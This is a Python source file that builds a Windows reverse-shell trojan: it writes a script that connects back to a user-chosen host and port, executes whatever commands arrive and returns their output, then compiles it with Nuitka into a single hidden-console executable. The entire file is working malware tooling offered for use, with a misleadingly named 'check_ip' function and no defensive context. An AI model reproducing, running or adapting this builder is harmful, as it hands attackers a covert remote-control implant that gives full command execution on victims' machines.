import argparse
import os
import shutil

R = '\033[31m'
G = '\033[32m'
RESET = '\033[0m'
C = '\033[36m'

try:
    import nuitka
except ModuleNotFoundError:
    print(f"{G}Installing Nuitka exe generator{RESET}")
    os.system("python3 -m pip install -U nuitka||python -m pip install -U nuitka")


def check_ip(ip, port, outputexe):

    temp = outputexe
    try:
        outputexe = outputexe.split(".")
        outputexe = outputexe[0]
    except:
        outputexe = temp
        temp = None

    temp_file = open(outputexe + ".py", "w")
    temp_file.write(f"""
import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "{ip}"
s.connect((ip, {port}))

while True:
    command = s.recv(1024).decode()

    if command != "#display_path":

        try:
            command = command.split("#")
            command = command[0]
        except:
            pass

        result = subprocess.getoutput(command)

        if result == "":
            s.send(" ".encode())
        s.send(result.encode("utf-8"))

    if command == "#display_path":
        s.send((os.getcwd()).encode("utf-8"))

    try:
        if command[0] == 'c' and command[1] == 'd':
            if command != 'cd':
                command = command.split(" ")
                try:
                    os.chdir(command[1])
                except Exception as e:
                    pass
    except Exception:
        pass

    """)
    temp_file.close()

    print(f"python -m nuitka --mingw64 {os.getcwd()}/{temp_file.name} --standalone --onefile --windows-disable-console||python3 -m nuitka --mingw64 {temp_file.name} --standalone --onefile  --windows-disable-console")
    os.system(f"python -m nuitka --mingw64 {os.getcwd()}/{temp_file.name} --standalone --onefile --windows-disable-console")

    try:
        os.remove(temp_file.name)
        shutil.rmtree(outputexe + ".build")
        shutil.rmtree(outputexe + ".dist")
        shutil.rmtree(outputexe + ".onefile-build")

        print(f"{G}Successfully generated {outputexe}.exe{RESET}")
    except Exception as e:
        print(e)



parser = argparse.ArgumentParser()
required_args = parser.add_argument_group("Required arguments")
required_args.add_argument("-H", "--host", type=str, help="Ip address on which you want to receive shell", required=True)
required_args.add_argument("-p", "--port", type=int, help="Host on which you want to receive shell", required=True)
required_args.add_argument("-o", "--outfile", type=str, help="Port on which you want to receive shell", required=True)

args = parser.parse_args()

if __name__ == '__main__':
    check_ip(args.host, args.port, args.outfile)